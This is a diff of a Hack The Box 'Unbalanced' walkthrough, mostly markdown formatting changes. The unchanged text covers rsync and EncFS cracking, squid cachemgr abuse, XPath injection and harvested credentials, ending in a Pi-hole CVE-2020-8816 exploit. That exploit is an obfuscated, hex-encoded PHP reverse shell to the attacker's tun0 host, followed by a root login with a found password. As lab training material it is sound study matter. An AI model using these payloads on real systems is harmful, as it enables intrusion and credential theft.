@@ -1,11 +1,7 @@
 ![](unbalanced_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
-
-||
-|-----------|
-|Start with Nmap found __rsync__ on port 873 and __squid-proxy__ on port 3128. Inside the rsync database found EncFS-encrypted configuration files backups. After decrypting the folder i found the __squid.conf__ file. In the config file i found a internal hostname and __squid-cachemanager__ password. with the use of __squidclient__ i dump *fqdncache* data from cachemanager and found more internal host ips. after founding the vulnerable host with the __XPath__ vulnerbility i dumped some user creds and found a working ssh cred and get the __User flag__. Inside the user home directory found a __TODO__ which specified that __Pi-hole__ is running in the local. after somw enumeration i found out that the running pi-hole version is vulnerable for remote code execution. i get the shell as __www-data__ user and from this user i can read some of the root directory files and form one of these files found the root password and get the __Root flag__.|
 
 # Scanning
 
@@ -22,16 +18,14 @@ PORT     STATE SERVICE    VERSION
 |_http-title: ERROR: The requested URL could not be retrieved
 ```
 
-## web_server!!
-
-__Squid http proxy :__ Squid is a caching and forwarding HTTP web proxy. It has a wide variety of uses, including speeding up a web server by caching repeated requests, caching web, DNS and other computer network lookups for a group of people sharing network resources, and aiding security by filtering traffic.
+**Squid http proxy :** Squid is a caching and forwarding HTTP web proxy. It has a wide variety of uses, including speeding up a web server by caching repeated requests, caching web, DNS and other computer network lookups for a group of people sharing network resources, and aiding security by filtering traffic.
 
 
 * add this proxy in `foxyproxy`
 
-__goto :__ `http://10.10.10.200`
+**goto :** `http://10.10.10.200`
 
-__Error :__ Access Denied.
+**Error :** Access Denied.
 
 * i don't have any host that is allowed from the proxy so i can not get much information from here for now.
 
@@ -62,9 +56,9 @@ rsync is a utility for efficiently transferring and synchronizing files between 
 
 	  0 directories, 75 files
 
-  __folder is EncFS-encrypted of system configuration files backup.__
+  **folder is EncFS-encrypted of system configuration files backup.**
 
-__EncFS :__ EncFS is a Free (LGPL) FUSE-based cryptographic filesystem. It transparently encrypts files, using an arbitrary directory as storage for the encrypted files. ... Files are encrypted using a volume key, which is stored either within or outside the encrypted source directory. A password is used to decrypt this key.
+**EncFS :** EncFS is a Free (LGPL) FUSE-based cryptographic filesystem. It transparently encrypts files, using an arbitrary directory as storage for the encrypted files. ... Files are encrypted using a volume key, which is stored either within or outside the encrypted source directory. A password is used to decrypt this key.
 
 * in EncFS encryption all file name change into random text and create `.encfs6.xml` file that contains metadata of the encryption.
 
@@ -89,9 +83,9 @@ __EncFS :__ EncFS is a Free (LGPL) FUSE-based cryptographic filesystem. It trans
 
 	  Session completed
 
-  __Found Password :__ `bubblegum`
+  **Found Password :** `bubblegum`
 
-* decrypt conf_backups require [encfs](https://github.com/vgough/encfs) tool's __encfsctl__ utility which decrypt encfs filesystem.
+* decrypt conf_backups require [encfs](https://github.com/vgough/encfs) tool's **encfsctl** utility which decrypt encfs filesystem.
 
 	`encfsctl export conf_backups encfs_decrypt`
 
@@ -121,7 +115,7 @@ encfs_decrypt
 
     squid.conf:acl intranet dstdomain -n intranet.unbalanced.htb
 
-__Internal Host :__ intranet.unbalanced.htb
+**Internal Host :** intranet.unbalanced.htb
 
 * Host is found in `squid.conf` and then i rewind that there a Squid http proxy service running on port 873 in the box.
 * i already add proxy in my browser and now found a host that can accessable from the proxy.
@@ -140,13 +134,13 @@ __Internal Host :__ intranet.unbalanced.htb
 	  Usage: cachemgr_passwd password action action ...
 	  
 * in the squid config file `cachemgr_passwd` Specify passwords for cachemgr operations.
-* `cachemgr_passwd` has tow part in it __First__ is *Password* and __second__ is *action* that are allowed on that passwd
+* `cachemgr_passwd` has tow part in it **First** is *Password* and **second** is *action* that are allowed on that passwd
 
 * in this squid config file
-  * __First :__ passwd: `Thah$Sh1`
-  * __Second :__ actiions: `menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events`
+  * **First :** passwd: `Thah$Sh1`
+  * **Second :** actiions: `menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events`
 
-* in [CacheManager](https://wiki.squid-cache.org/Features/CacheManager) documentation i found a tool [squidclient](https://wiki.squid-cache.org/SquidClientTool)__:__ *A command line utility for performing web requests. It also has a special ability to send cache manager requests to Squid proxies.*
+* in [CacheManager](https://wiki.squid-cache.org/Features/CacheManager) documentation i found a tool [squidclient](https://wiki.squid-cache.org/SquidClientTool)**:** *A command line utility for performing web requests. It also has a special ability to send cache manager requests to Squid proxies.*
 
 # User Exploit
 
@@ -154,7 +148,7 @@ __Internal Host :__ intranet.unbalanced.htb
 
 * from all specified actions in the config file i found some useful actions, [here](https://etutorials.org/Server+Administration/Squid.+The+definitive+guide/Chapter+14.+Monitoring+Squid/14.2+The+Cache+Manager/) is a good blog on CacheManager actions.
 
-__Action :__ __[fqdncache](https://wiki.squid-cache.org/Features/CacheManager/FqdnCache) :__ This is a report of the Squid DNS cache for IP address resolution. this is same as iptable.
+**Action :** **[fqdncache](https://wiki.squid-cache.org/Features/CacheManager/FqdnCache) :** This is a report of the Squid DNS cache for IP address resolution. this is same as iptable.
 
   `squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:fqdncache`
 ```diff
@@ -204,7 +198,7 @@ __Action :__ __[fqdncache](https://wiki.squid-cache.org/Features/CacheManager/Fq
 * I try diffrent types of injection.
 * I create a simple burp intruder list of diffrent injections from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) but none of them worked on any of these hosts.
   
-  __*for intercepting internal Hosts request i set squid proxy `http://10.10.10.200:3128` as [upstream proxy](https://portswigger.net/support/burp-suite-upstream-proxy-servers) in burpSuite*__
+  **_for intercepting internal Hosts request i set squid proxy `http://10.10.10.200:3128` as [upstream proxy](https://portswigger.net/support/burp-suite-upstream-proxy-servers) in burpSuite_**
 
 * eventually i try for 172.31.179.1 and this give an error -
 
@@ -216,9 +210,9 @@ __Action :__ __[fqdncache](https://wiki.squid-cache.org/Features/CacheManager/Fq
 
 ## XPATH injection [1](https://portswigger.net/kb/issues/00100600_xpath-injection) [2](https://owasp.org/www-community/attacks/XPATH_Injection)
 
-__Passowrd field is vulnerable for xpath injection__
+**Passowrd field is vulnerable for xpath injection**
 
-__XPathi Payload__
+**XPathi Payload**
 
 	' or '1'='1
 	
@@ -247,13 +241,13 @@ __XPathi Payload__
 
 * after some time on brupSuite testing XPath injection i found a way to extract password strings using xpath injection like sqli.
 
-  __Payload :__ `' or Username='bryan'and substring(Password,$i,1)='$c`
+  **Payload :** `' or Username='bryan'and substring(Password,$i,1)='$c`
 
-* i create a bruteforce [script](exploit-scr/xpath_bf.py) that extract password from database using XPath vulnerability. __payload is worked like a sql boolean based injection.__ when `$i=$c` then page return `Username` contact details, and if `$i!=$c` then page return `Invalid credentials.`*where __i__ is a int and __c__ is a char*
+* i create a bruteforce [script](exploit-scr/xpath_bf.py) that extract password from database using XPath vulnerability. **payload is worked like a sql boolean based injection.** when `$i=$c` then page return `Username` contact details, and if `$i!=$c` then page return `Invalid credentials.`*where **i** is a int and **c** is a char*
 
   * it takes some time to extract all password form the database
 
-__creds__
+**creds**
 ```
 rita:password01!
 jim:stairwaytoheaven
@@ -270,7 +264,7 @@ sarah:sarah4evah
  1 of 1 target successfully completed, 1 valid password found
 ```
 
-__ssh-creds :__ `bryan:ireallyl0vebubblegum!!!`
+**ssh-creds :** `bryan:ireallyl0vebubblegum!!!`
 
 
 ## USER:bryan shell
@@ -298,7 +292,7 @@ f91a0994************************
 	  - Run Pi-hole configuration script [TODO]
 	  - Expose Pi-hole ports to the network [TODO]
 
-__[Pi-hole](https://pi-hole.net/) :__ Pi-hole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network.
+**[Pi-hole](https://pi-hole.net/) :** Pi-hole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network.
 
 ## enumerating Pi-hole
 
@@ -309,21 +303,21 @@ __[Pi-hole](https://pi-hole.net/) :__ Pi-hole is a Linux network-level advertise
 	  LISTEN    0         128              127.0.0.1:8080             0.0.0.0:*
 	  LISTEN    0         128              127.0.0.1:5553             0.0.0.0:*
 
-  __Port 5553__ is not responding
+  **Port 5553** is not responding
   
-  __Port 8080__ give an error
+  **Port 8080** give an error
   
 	  [ERROR]: Unable to parse results from queryads.php: Unhandled error message (Invalid domain!)
 
 *setup ssh with tunnel*
 
-__Gobuster__ 
+**Gobuster** 
 
 `gobuster dir -u http://127.0.0.1:8080/ -w words -b 200`
 
 *I use `-b` to ignore all 200 responses. because of that server's custom error every request give 200.*
 
-__found :__ `/admin (Status: 301)`
+**found :** `/admin (Status: 301)`
 
 * from the `http://127.0.0.1:8080/admin/` i got Pi-hole admin panel.
 
@@ -348,9 +342,9 @@ __found :__ `/admin (Status: 301)`
 	      172.31.179.1     0x1         0x2         02:42:ac:1f:b3:01     *        br-742fc4eb92b1
 	      172.31.11.3      0x1         0x2         02:42:ac:1f:0b:03     *        br-742fc4e	      
 
-      __IP 172.31.179.1__ is the same XPath vulnerable host
+      **IP 172.31.179.1** is the same XPath vulnerable host
 
-      __IP 172.31.11.3__ is Pi-hole docker IP
+      **IP 172.31.11.3** is Pi-hole docker IP
 
 * Access to `172.31.11.3` from squid-proxy gives Pi-hole admin console and here i found Pi-hole version is `4.3.2`
   
@@ -362,20 +356,20 @@ __found :__ `/admin (Status: 301)`
 
 * login with temporary password:admin - login successful
 
-* __IP:127.0.0.1__ and __IP: 172.31.11.3__ give same result because Pi-hole instance is accessible from both local and squid-proxy.
+* **IP:127.0.0.1** and **IP: 172.31.11.3** give same result because Pi-hole instance is accessible from both local and squid-proxy.
 
 * search for Pi-hole 4.3.2 vulnerability i got an exploit from [ExploitDB](https://www.exploit-db.com/exploits/48727)
 
 
 ## Exploting Pi-hole
 
-__Exploit Impact :__ Pi-hole Web v4.3.2 (aka AdminLTE) allows Remote Code Execution by privileged dashboard users via a crafted DHCP static lease.
+**Exploit Impact :** Pi-hole Web v4.3.2 (aka AdminLTE) allows Remote Code Execution by privileged dashboard users via a crafted DHCP static lease.
 
-__Exploit Reason :__ defining MAC address while configuring DHCP leases form pi-hole is not validate the mac address properly so one can manipulate that mac address field and put reverse shell and excute it.
+**Exploit Reason :** defining MAC address while configuring DHCP leases form pi-hole is not validate the mac address properly so one can manipulate that mac address field and put reverse shell and excute it.
 
-__refer to [natedotred bolg](https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/) for complete exploitation process.__
+**refer to [natedotred bolg](https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/) for complete exploitation process.**
 
-__Goto__ Pi-hole Web-Console >> Admin-Panel >> Settings (login with Password:admin) >> DHCP tab
+**Goto** Pi-hole Web-Console >> Admin-Panel >> Settings (login with Password:admin) >> DHCP tab
 
 	http://172.31.11.3/admin/settings.php?tab=piholedhcp
 
@@ -387,7 +381,7 @@ __Goto__ Pi-hole Web-Console >> Admin-Panel >> Settings (login with Password:adm
 
 	  aaaaaaaaaaaa$PATH
 
-* configure __DHCP leas__ with tampered MAC
+* configure **DHCP leas** with tampered MAC
 	  
 	  MAC address		IP address	Hostname	
 	
@@ -401,7 +395,7 @@ __Goto__ Pi-hole Web-Console >> Admin-Panel >> Settings (login with Password:adm
 
   pi-hole [`savesettings.php`](dump/savesettings.php) is responsible for this vulnerability.
 
-__[lines 53-57](dump/savesettings.php#L53):__ The application first validates the MAC address format using the function preg_match().
+**[lines 53-57](dump/savesettings.php#L53):** The application first validates the MAC address format using the function preg_match().
 ```
 function validMAC($mac_addr)
 {
@@ -410,7 +404,7 @@ function validMAC($mac_addr)
 }
 ```
 
-__[lines 542-550](demp/savesettings.php#L542):__ then check only [html special characters](https://www.php.net/manual/en/function.htmlspecialchars.php) and converts the input to uppercase.
+**[lines 542-550](demp/savesettings.php#L542):** then check only [html special characters](https://www.php.net/manual/en/function.htmlspecialchars.php) and converts the input to uppercase.
 ```
 $mac = $_POST["AddMAC"];
 if(!validMAC($mac))
@@ -420,7 +414,7 @@ if(!validMAC($mac))
 $mac = strtoupper($mac);
 ```
 
-__[lines 588-592](dump/savesettings.php#L588):__ then adds the entry to DHCP using a pihole system command.
+**[lines 588-592](dump/savesettings.php#L588):** then adds the entry to DHCP using a pihole system command.
 ```
 if(!strlen($error))
 {
@@ -429,23 +423,23 @@ if(!strlen($error))
 }
 ```
 
-__Exploit exception :__ MAC address input convert input data in upperCase letters and if we put shellcode in it. it converts all code in upperCase, As Linux commands are case sensitive, this would fail.
+**Exploit exception :** MAC address input convert input data in upperCase letters and if we put shellcode in it. it converts all code in upperCase, As Linux commands are case sensitive, this would fail.
 
-*the way to overcome this difficulty is to make use of __environment variables__ and __POSIX Shell__ Parameter Expansions.*
+*the way to overcome this difficulty is to make use of **environment variables** and **POSIX Shell** Parameter Expansions.*
 
 ### Manual Exploit
 
 #### payload Encoding 
 
-__Reverse Shell Payload :__ `aaaaaaaaaaaa&&php -r ‘$sock=fsockopen(“tun0”,4141);exec(“/bin/sh -i <&3 >&3 2>&3”);’`
+**Reverse Shell Payload :** `aaaaaaaaaaaa&&php -r ‘$sock=fsockopen(“tun0”,4141);exec(“/bin/sh -i <&3 >&3 2>&3”);’`
 
 there are three peices in the payload
 
-* __First__, MAC address `aaaaaaaaaaaa` use as it is.
+* **First**, MAC address `aaaaaaaaaaaa` use as it is.
 
-* __Second__, environment variables, In the encoded shell command we define the $P, $H and $R shell parameters that contain their matching lower-case character with the following POSIX Shell Parameter Expansions:
+* **Second**, environment variables, In the encoded shell command we define the $P, $H and $R shell parameters that contain their matching lower-case character with the following POSIX Shell Parameter Expansions:
 
-__Example__
+**Example**
 
 	❯ W=${PATH#/???/}
 	echo $W
@@ -454,7 +448,7 @@ __Example__
 	echo $P
 	p
 
-__All variables:__
+**All variables:**
 
 	W=${PATH#/???/}
 	P=${W%%?????:}
@@ -469,7 +463,7 @@ __All variables:__
 	  
   here `$IFS` is a default shell delimiter character which is a space.
 
-__Third__, reverse shell code `'php -r \'$sock=fsockopen("tun0",4141);exec("/bin/sh -i <&3 >&3 2>&3");\''` in hex coded form, inside the php function - `’EXEC(HEX2BIN(“<shellcode>”));’&&`
+**Third**, reverse shell code `'php -r \'$sock=fsockopen("tun0",4141);exec("/bin/sh -i <&3 >&3 2>&3");\''` in hex coded form, inside the php function - `’EXEC(HEX2BIN(“<shellcode>”));’&&`
 
 * I use python to encode payload into hex - 
 
@@ -481,11 +475,11 @@ __Third__, reverse shell code `'php -r \'$sock=fsockopen("tun0",4141);exec("/bin
 	  >>> p.encode("hex").upper()
 	  '706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3437222C34313431293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27'
 
-__Final payload :__ `aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("<shellcode>"));'&&`
+**Final payload :** `aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("<shellcode>"));'&&`
 
-__My Payload :__ `aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3339222C34313431293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27"));'&&`
+**My Payload :** `aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3339222C34313431293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27"));'&&`
 
-__Notes:__ Both IPs from squid-proxy `172.31.11.3` or with ssh tunnel on `127.0.0.1:8080` give a reverse shell as `www-data`
+**Notes:** Both IPs from squid-proxy `172.31.11.3` or with ssh tunnel on `127.0.0.1:8080` give a reverse shell as `www-data`
 
 # Root Privesc
 
@@ -524,7 +518,7 @@ __Notes:__ Both IPs from squid-proxy `172.31.11.3` or with ssh tunnel on `127.0.
 	  # Set admin email
 	  /usr/local/bin/pihole -a email admin@unbalanced.htb
 
-* there is a Pi-hole admin password: __bUbBl3gUm$43v3Ry0n3!__ and su using this password from bryan's ssh shell worked and get root shell
+* there is a Pi-hole admin password: **bUbBl3gUm$43v3Ry0n3!** and su using this password from bryan's ssh shell worked and get root shell
 
 	  bryan@unbalanced:~$ su - root
 	  Password: bUbBl3gUm$43v3Ry0n3!
